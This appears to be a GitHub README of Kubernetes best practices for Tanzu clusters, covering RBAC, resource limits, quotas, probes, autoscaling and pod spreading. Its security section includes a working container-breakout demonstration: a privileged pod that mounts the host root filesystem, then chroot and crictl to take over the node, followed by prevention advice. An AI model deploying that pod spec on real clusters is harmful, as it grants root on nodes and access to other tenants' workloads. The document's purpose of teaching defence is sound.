![kubernetes](kubernetes.jpg)

- [Kubernetes Best Practices](https://github.com/pivotal-ben-chacko/Tanzu-Kubernetes-Grid/tree/main/kubernetes#kubernetes-best-practices)

- [Understanding Kubernetes RBAC](https://github.com/pivotal-ben-chacko/Tanzu-Kubernetes-Grid/tree/main/kubernetes#understanding-kubernetes-rbac)

- [Pod Resource Management](https://github.com/pivotal-ben-chacko/Tanzu-Kubernetes-Grid/tree/main/kubernetes#pod-resource-management)

- [Namespace Resource Management](https://github.com/pivotal-ben-chacko/Tanzu-Kubernetes-Grid/tree/main/kubernetes#namespace-resource-management)

- [Securing Kubernetes](https://github.com/pivotal-ben-chacko/Tanzu-Kubernetes-Grid/tree/main/kubernetes#securing-kubernetes)

- [Configuring Liveness, Readines and Startup Proobe](https://github.com/pivotal-ben-chacko/Tanzu-Kubernetes-Grid/tree/main/kubernetes#configuring-liveness-readiness-and-startup-probes)

- [Horizontal Pod Autoscaler (HPA)](https://github.com/pivotal-ben-chacko/Tanzu-Kubernetes-Grid/tree/main/kubernetes#horizontal-pod-autoscaler-hpa)

- [Pod Topology Spread Constraints](https://github.com/pivotal-ben-chacko/Tanzu-Kubernetes-Grid/tree/main/kubernetes#pod-topology-spread-constraints)


## Kubernetes Best Practices

 - Base your images on well known trusted images to prevent supply chain attacks.
 - You should treat your image tag as immutable. Name your images with some combination of the semantic version and the SHA hash of the commit.
 - Run your application with at least two replicas to maintain HA.
 - Limit the scope of access for developers to just the namespace they require to develop in. This will limit the chance that a developer could accidentally delete resources in another namespace. 
 

    **Supervisor Cluster**
    
    The supervisor cluster is heavily restricted. Only the administrator@vsphere.local user has limited access to some of the cluster resources. The only user that has true administrative access to the supervisor cluster is root which is a special user found only if you *ssh* into a supervisor control plane node. In practice you should never edit resources in the supervisor cluster.

**Limiting access to namespaces**

1. First add the user or group to the namespace you would like the user or group to have access to. Ensure you only select *Read Only* privileges.

    ![enter image description here](user.png)

    **Supported User and Group Fields**
    
    | Field |Discription  |
    |--|--|
    | http://sso:USER-NAME@domain/ | For example, a local user name, such as `sso:joe@vsphere.local`. |
    |http://sso:GROUP-NAME@domain/ |For example, a group name from a directory server integrated with the vCenter Server, such as `sso:devs@ldap.example.com`. |

3. Then, in the cluster you want to give the user or group access to a namespace, apply the following RoleBinding to give edit privileges to the namespace.

    ```sh
    kind: RoleBinding
    apiVersion: rbac.authorization.k8s.io/v1
    metadata:
      name: rolebinding-cluster-test
      namespace: test
    roleRef:
      kind: ClusterRole
      name: edit #Default ClusterRole
      apiGroup: rbac.authorization.k8s.io
    subjects:
    - kind: User
      name: sso:test@vsphere.local #sso:<username>@<domain>
      apiGroup: rbac.authorization.k8s.io
    ```

**Namespace annotation**

After creating a namespace you want to attach some metadata to it. For example, the contact information for the team that will be utilizing the namespace. Generally this will be in the form of annotations.

```sh
ns='dev-namespaace'
kubectl create namespace ${ns}
kubectl annotate namespace ${ns} annotation_key=annotation_value
```
## Understanding Kubernetes RBAC

In Kubernetes, **ClusterRoles** and **Roles** define the actions a user can perform within a cluster or namespace, respectively. You can assign these roles to Kubernetes **subjects** (users, groups, or service accounts) with **role bindings and cluster role bindings**. 

A Role always sets permissions within a particular  [namespace](https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces); when you create a Role, you have to specify the namespace it belongs in.

ClusterRole, by contrast, is a non-namespaced resource. The resources have different names (Role and ClusterRole) because a Kubernetes object always has to be either namespaced or not namespaced; it can't be both.

ClusterRoles have several uses. You can use a ClusterRole to:

1.  define permissions on namespaced resources and be granted access within individual namespace(s)
2.  define permissions on namespaced resources and be granted access across all namespaces
3.  define permissions on cluster-scoped resources

If you want to define a role within a namespace, use a Role; if you want to define a role cluster-wide, use a ClusterRole.

**Role and RoleBinding**
The following role / rolebinding will allow read write operations for the user Codey in the namespace dev-namespace.
```sh
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: read-write
  namespace: dev-namespace
rules:
- apiGroups:
  - "*"
  resources:
  - batch
  - deployments
  - daemonsets
  - configmaps
  - cronjobs
  - jobs
  - pods
  - replicasets
  - services
  - secrets
  - statefulsets
  - ingresses
  - replicationcontrollers
  - horizontalpodautoscalers
  verbs:
  - get
  - list
  - watch
  - create
  - update
  - patch
  - delete
---
apiVersion: rbac.authorization.k8s.io/v1beta1
kind: RoleBinding
metadata:
  name: read-write-binding  
roleRef:  
  kind: Role
  name: read-write  
  apiGroup: rbac.authorization.k8s.io  
subjects:  
- kind: User  
  name: codey  
  apiGroup: rbac.authorization.k8s.io
```

Similarly the following ClusterRole / ClusterRolebinding gives the user, infra-monitor, rights to view and list resources across the cluster but no edit or write privileges.


```sh
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: infra-monitor
rules:
- apiGroups: [""] # "" indicates the core API group
  resources: ["*"] # "*" applies to all resourc types 
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: infra-monitor-binding
roleRef:
  kind: ClusterRole
  name: infra-monitor
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: User
  name: sso:infra@vsphere.local
  apiGroup: rbac.authorization.k8s.io
```  

## Pod Resource Management

One of the most important aspects of managing applications in Kubernetes is appropriately managing pod resources. Managing pod resources consists of managing CPU and memory to optimize the overall utilization of your Kubernetes cluster.

For the scheduler to optimize resources and make intelligent placement decisions, it needs to understand the requirements of an application. As an example if a container needs a minimum of 2GB to perform, we need to define this in our pod spec, so the scheduler knows that the container requires 2GB of memory on the host to which it schedules the container.

**Resource Request**

 ```sh
apiVersion: v1
kind: Pod
metadata:
  name: memory-req
spec:
  containers:
  - name: memory-req
    image: nginx
    resources: 
      requests:
        memory: 2000Mi
```

A resource request defines that a container requires X amount of CPU or memory to be scheduled. If you were to specify that the pod requires 8GB of memory and all your nodes have 7.5GB of memory, the pod would not be scheduled. If the pod can not be scheduled, it will go into a pending state.

To determine the available free resources in your cluster, use the following command to determine the available resources on each node.

```sh
kubectl top nodes
```

**Resource Limits**

Resource limits define the maximum CPU or memory that a pod is given. With CPU limits, the container is throttled from using more than its specified limit. With memory limits, the pod is restarted if it reaches its limit. The pod might be restarted on the same host or a different host within the cluster.

Specifying limits for containers is a good practice to ensure that applications are allotted their fair share of resources within the cluster.

```sh
apiVersion: v1
kind: Pod
metadata:
  name: limits
  namespace: limits-ns
spec:
  containers:
  - name: frontend
    image: nginx:alpine
    resources:
      limits:
        cpu: "700m"
        memory: "200Mi"
      requests:
        cpu: "700m"
        memory: "200Mi"
```

When a pod is created, it's assigned one of the following Quality of Service (QoS) classes

 - Guarenteed (when requests and limits are the same for both memory and CPU)
 - Burstable (when limits are set higher then the requests)
 - Best Effort (when no requests or limits are set)

**Example:**

Let's take a look at an example were we have a misbehaving app that has no resource limits set to throttle a potential CPU runaway. 


```sh 
apiVersion: v1
kind: Pod
metadata:
  labels:
    test: load-test
  name: load-test
spec:
  containers:
  - name: load-test
    image: nginx
    args:
    - /bin/bash
    - -c
    - dd if=/dev/zero of=/dev/null | dd if=/dev/zero of=/dev/null | dd if=/dev/zero of=/dev/null | dd if=/dev/zero of=/dev/null
```

Give the metrics server about a minute to collect metrics on the pod and then run the following: 

```sh
kubectl top pod load-test
NAME        CPU(cores)   MEMORY(bytes)
load-test   3935m        0Mi
```
You can see above that the pod is using roughly 4 cores of CPU to run the workload. This pod is running on a 4 core node and therefor is using up all the CPU resources available to the node. This situation would starve other workloads from receiving its fair share of the CPU.

In the next example, we will apply a *resource limit*  to limit the amount of CPU and memory the pod can consume. 

```sh
apiVersion: v1
kind: Pod
metadata:
  labels:
    test: load-test
  name: load-test
spec:
  containers:
  - name: load-test
    image: nginx
    args:
    - /bin/bash
    - -c
    - dd if=/dev/zero of=/dev/null | dd if=/dev/zero of=/dev/null | dd if=/dev/zero of=/dev/null | dd if=/dev/zero of=/dev/null
    resources:
      limits:
        cpu: "700m"
        memory: "200Mi"
      requests:
        cpu: "700m"
        memory: "200Mi"
```

After applying the resource limits you can see below that the pod is now limited to the amount of CPU and memory that we have defined as the maximum the pod can utilize. 

```sh
kubectl top pod load-test
NAME        CPU(cores)   MEMORY(bytes)
load-test   697m         0Mi
```

**PodDisruptionBudgets**

On occasion Kubernetes might need to evict pods from a host. There are two types of evictions: voluntary and involuntary disruptions.

 - Involuntary disruptions can be caused by hardware failure, network
   issues, kernel panics or a node being out of resources.
 - Voluntary evictions can be caused by performing maintenance on the
   cluster, the cluster autoscaler deallocating nodes, or updating pod
   templates.

To ensure uptime of the application, you can set a PodDisruptionBudget to ensure uptime of the application when pods need to be evicted. A PodDisruptionBudget allows you to set a policy on the minimum available and maximum un-available pods during voluntary eviction events.

Example:
```sh
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: frontend-pdb
  namespace: dev-ns
spec:
  minAvailable: 5
  selector:
    matchLabels:
      app: frontend
```

 In the above example we specify that there must be at least five replicas available at any given time.

In the example below we will specify a maximum number of replicas that can be unavailable.

```sh
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: frontend-pdb
  namespace: dev-ns
spec:
  maxUnavailable: 20%
  selector:
    matchLabels:
      app: frontend
```

## Namespace Resource Management 

Similar to limiting resources consumable by a pod, you can limit the available recources within a namespace to prevent over consumption.

Example:

```sh
apiVersion: v1
kind: ResourceQuota
metadata:
  name: compute-quota
  namespace: dev
spec:
  hard:
    requests.cpu: "10"
    requests.memory: 100Gi
    limits.cpu: "10"
    limits.memory: 100Gi
```

The preceding example sets a hard limit on the total resources that can be consumbed by all workloads running in the namespace.

We can also create a LimitRange object in our Namespace which can be used to set limits on resources on containers (Pods) running within the namespace. This is used to provide default limit values for Pods which do not specify this value themselves to equally distribute resources within a namespace.

```sh
apiVersion: "v1"
kind: "LimitRange"
metadata:
  name: "resource-limits"
spec:
  limits:
    - type: "Pod"
      max:
        cpu: "2"
        memory: "1Gi"
      min:
        cpu: "200m"
        memory: "6Mi"
    - type: "Container"
      max:
        cpu: "2"
        memory: "1Gi"
      min:
        cpu: "100m"
        memory: "4Mi"
      default:
        cpu: "300m"
        memory: "200Mi"
      defaultRequest:
        cpu: "200m"
        memory: "100Mi"
```

## Securing Kubernetes

The term “Container Breakout” refers to the event where a malicious or legitimate user is able to escape the container isolation and access resources (e.g. filesystem, processes, network interfaces) on the host machine.

The following demonstrates where it is possible to abuse *hostpath* to gain root access to the underlying Kubernetes node.

Apply the following to a namespace in the cluster:

```sh
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: attacker-pod
  name: attacker-pod
  namespace: test
spec:
  hostPID: true
  hostIPC: true
  hostNetwork: true
  volumes:
  - name: host-fs
    hostPath:
      path: /
  containers:
  - image: ubuntu
    name: attacker-pod
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host-fs
      mountPath: /host
  restartPolicy: Never
```
Next, exec into the container:

```sh
kubectl exec -it attacker-pod -n test -- bash
root@workload-worker-nodepool-a1-m2r7d-847d79df59-69v67:/#
```

Next we *chroot* our process to the Node’s root filesystem accessible to us in _/host_ directory due to _hostPath_ volume mount.

```sh
root@workload-worker-nodepool-a1-m2r7d-847d79df59-69v67:/# chroot /host/ bash
root [ / ]#
```

At this point we can access all  Containers running in the node irrespective of which Pod or Namespace they belong to.

```sh
root [ / ]# crictl ps
CONTAINER           IMAGE               CREATED             STATE               NAME                               ATTEMPT             POD ID
67a1e02b051d9       88736fe827391       7 hours ago         Running             nginx                              0                   58187e661b0ec
c20e23877b741       a8780b506fa4e       7 hours ago         Running             attacker-pod                       0                   66ff16a536375
0a6e4a5510c6c       d8c2bca7c9ec1       8 hours ago         Running             rabbitmq                           0                   91cf266cf5623
1d333f889f709       88736fe827391       8 hours ago         Running             nginx                              0                   0750d1
```

**Prevention**

 To prevent such an attack, use Tanzu Mission Control (TMC) and apply a *baseline* or *strict* security policy to the cluster. These policies will restrict risky actions such as mounting volumes using hostpath and privileged escalation among other things.

## Configuring Liveness, Readiness and Startup Probes

The kubelet aka the "node agent" that runs on each node uses liveness probes to know when to restart a container. For example, liveness probes could catch a deadlock, where an application is running, but unable to make progress.

```sh
apiVersion: v1
kind: Pod
metadata:
  labels:
    test: liveness
  name: liveness-exec
spec:
  containers:
  - name: liveness
    image: registry.k8s.io/busybox
    args:
    - /bin/sh
    - -c
    - touch /tmp/healthy; sleep 30; rm -f /tmp/healthy; sleep 600
    livenessProbe:
      exec:
        command:
        - cat
        - /tmp/healthy
      initialDelaySeconds: 5
      periodSeconds: 5
```

In the configuration file above there are two fields of concern:

 1. **periodSeconds** - specifies that the kubelet should perform a liveness probe every 5 seconds.
 2. **initialDelaySeconds** - tells the kubelet that it should wait 5 seconds before performing the first probe.

To perform a probe, the kubelet executes the command `cat /tmp/healthy` in the target container. If the command succeeds, it returns 0, and the kubelet considers the container to be alive and healthy. If the command returns a non-zero value, the kubelet kills the container and restarts it.

**Readiness Probe**

Sometimes, applications are temporarily unable to serve traffic. For example, an application might need to load large data or configuration files during startup, or depend on external services after startup. In such cases, you don't want to kill the application, but you don't want to send it requests either. Kubernetes provides readiness probes to detect and mitigate these situations. A pod with containers reporting that they are not ready does not receive traffic through Kubernetes Services.


## Horizontal Pod Autoscaler (HPA)

The Kubernetes HPA allows you to scale your deployments based on CPU, memory or custom metrics. It also allows you to set the minimum and maximum number of pods available at any given time. Setting the minimum and maximum is critical as you don't want the HPA to scale the replicas to an infinite amount due to a misbehaving app.

The HPA has the following default setting for sync metrics, upscaling and downscaling replicas.

 - *horizontal-pod-autoscaler-sync-period*: Default of 30s for syncing metrics
 - horizontal-pod-autoscaler-upscale-delay: Default of 3m between 2 upscale operations.
 - horizontal-pod-autoscaler-upscale-delay: Default of 5m between 2 downscale operations.

**Example:**

Run the following deployment
```sh
apiVersion: apps/v1
kind: Deployment
metadata:
  name: php-apache
spec:
  selector:
    matchLabels:
      run: php-apache
  replicas: 1
  template:
    metadata:
      labels:
        run: php-apache
    spec:
      containers:
      - name: php-apache
        image: registry.k8s.io/hpa-example
        ports:
        - containerPort: 80
        resources:
          limits:
            cpu: 500m
          requests:
            cpu: 200m
---
apiVersion: v1
kind: Service
metadata:
  name: php-apache
  labels:
    run: php-apache
spec:
  ports:
  - port: 80
  selector:
    run: php-apache
```

Now we specify a HorizontalPodAutoscaler that maintains between 1 and 10 replicas. The HPA will decrease or increase the number of replicas to maintain an average CPU utilization of 50% across all pods.

```sh
kubectl autoscale deployment php-apache --cpu-percent=50 --min=1 --max=10
```

Check the current status of the HPA by running: `kubectl get hpa`

**Increase Load**
Next we increase the load on the pod to see how the autoscaler will react. To do this we'll start a different pod to send continuous requests to the php-apache service to simulate traffic.

```sh
kubectl run -i --tty load-generator --rm --image=busybox:1.28 --restart=Never -- /bin/sh -c "while sleep 0.01; do wget -q -O- http://php-apache; done"
```

Now run the following and watch the status of the HPA

```sh
kubectl get hpa php-apache --watch
NAME         REFERENCE               TARGETS   MINPODS   MAXPODS   REPLICAS   AGE
php-apache   Deployment/php-apache   0%/50%     1         10        1          58m
php-apache   Deployment/php-apache   249%/50%   1         10        1          58m
php-apache   Deployment/php-apache   249%/50%   1         10        4          58m
php-apache   Deployment/php-apache   249%/50%   1         10        5          59m
php-apache   Deployment/php-apache   56%/50%    1         10        5          59m
php-apache   Deployment/php-apache   49%/50%    1         10        6          60m
```

You can see that the autoscaler, increased the replica count to 6 which allowed the CPU utilization to settle at below 50% across all pods.

## Updating Deployments

Deployments are declarative objects that describe a deployed application. The two most common operations on a Deployment are scalling and application updates.

**Scalling a Deployment**

To scale up a deployment, you would edit your YAML file to increase the number of replicas:

```sh
...
spec:
  replicas: 4
...
```

**Updating a container image**

The other common use case for updating a Deployment is to roll out a new version of the software running in one or more containers. In this case you should update the software: 

```sh
...
      containers:
      - image: nginx:1.22
...
```

And then annotate the deployment to record the change.

```sh
...
spec:
  ...
  template:
    metadata:
      annotations:
        kubernetes.io/change-cause: "Update nginx version"
...
```

Run the following command to get the current status of the deployment:

```sh
kubectl rollout status deploy frontend
deployment "frontend" successfully rolled out
```

**Rollout history**

Kubernetes deployments maintain a history of rollouts, which can be useful for understanding the history of the rollouts and to roll back to a specific version in case of problems. 

Example:

```sh
kubectl rollout history deployment frontend 
REVISION  CHANGE-CAUSE
1         increase replica count
2         update ngninx version to 1.22
```

If there is an issue with the latest release and you want to rollback while you investigate. You can simply undo the last rollout: 

```sh
kubectl rollout undo deploy frontend
deployment.apps/frontend rolled back
```

## Pod Topology Spread Constraints

You can use topology spread constraints to control how Pods are spread across your cluster among failure-domains such as regions, zones, nodes, and other user-defined topology domains. This can help to achieve high availability as well as efficient resource utilization.

As an example you may want to evenly distribute pods across zones. In Zone A you have 6 nodes and in Zone B you have 3 nodes. It's possible that if you apply a deployment with 6 replicas that all 6 replicas will land in Zone A and none in Zone B where in reality what you wanted was 3 replicas in Zone A and 3 replicas in Zone B.

In order to have the pods land evenly across the two zones we can use *topologySpreadConstraints* 

```sh
apiVersion: apps/v1
kind: Deployment
metadata:
  labels:
    app: frontend
  name: frontend
  namespace: frontend
spec:
  replicas: 6
  selector:
    matchLabels:
      app: frontend
  template:
    metadata:
      labels:
        app: frontend
    spec:
      topologySpreadConstraints:
        - maxSkew: 1
          topologyKey: zone
          whenUnsatisfiable: DoNotSchedule
          labelSelector:
            matchLabels:
              app: frontend
      containers:
      - image: nginx:1.22
        name: frontend
```

From that manifest:

- **topologyKey: zone** implies the even distribution will only be applied to nodes that are labelled *zone: <any value>*

To simulate having more then one zone you can apply a label of zone=A to a quarter of the nodes in your cluster and the remaining can be labeled zone=B

Use the following command to label your workers zone A

```sh
kubectl label node worker-node-xxxx zone=A
```

After you have labeled all the nodes, it should look something like:

```sh
k get node --label-columns=zone
NAME                                               STATUS   ROLES                  AGE    VERSION            ZONE
worker-control-plane-x4q2c                         Ready    control-plane,master   8d     v1.22.9+vmware.1
worker-worker-nodepool-a1-vznjq-74b9888f7b-49dvk   Ready    <none>                 8d     v1.22.9+vmware.1   A
worker-worker-nodepool-a1-vznjq-74b9888f7b-85f49   Ready    <none>                 8d     v1.22.9+vmware.1   A
worker-worker-nodepool-a1-vznjq-74b9888f7b-cwfhn   Ready    <none>                 3h1m   v1.22.9+vmware.1   B
```

Now apply the yaml file above and ensure that the 6 replica pods have landed evenly across zones A and B. 

```sh
kubectl get pod -n frontend -o wide
NAME                        READY   STATUS    RESTARTS   AGE     IP              NODE                                               NOMINATED NODE   READINESS GATES
frontend-65ff846b56-5kpcq   1/1     Running   0          3m38s   192.168.3.181   worker-worker-nodepool-a1-vznjq-74b9888f7b-cwfhn   <none>           <none>
frontend-65ff846b56-b7cdg   1/1     Running   0          3m38s   192.168.3.182   worker-worker-nodepool-a1-vznjq-74b9888f7b-cwfhn   <none>           <none>
frontend-65ff846b56-cgvng   1/1     Running   0          3m38s   192.168.2.89    worker-worker-nodepool-a1-vznjq-74b9888f7b-49dvk   <none>           <none>
frontend-65ff846b56-nkch5   1/1     Running   0          3m38s   192.168.2.90    worker-worker-nodepool-a1-vznjq-74b9888f7b-49dvk   <none>           <none>
frontend-65ff846b56-vgk4q   1/1     Running   0          3m38s   192.168.3.180   worker-worker-nodepool-a1-vznjq-74b9888f7b-cwfhn   <none>           <none>
frontend-65ff846b56-w2mc9   1/1     Running   0          3m38s   192.168.2.91    worker-worker-nodepool-a1-vznjq-74b9888f7b-49dvk   <none>           <none>
```

As you can see above, the pods have been evenly distributed across the two zones. 

- 3 pods: worker-worker-nodepool-a1-vznjq-74b9888f7b-49dvk **zone A**

- 3 pods: worker-worker-nodepool-a1-vznjq-74b9888f7b-cwfhn **zone B**

For the most part the scheduler will evenly distribute pods across the cluster taking into consideration replicas already on a node all the while trying not to overload any one node, however this is only true during the creation of pods. 

Kubernetes will try to to spread your pods intelligently when it creates them but will not proactively enforce a good spread afterwards. For example if a node goes down, 
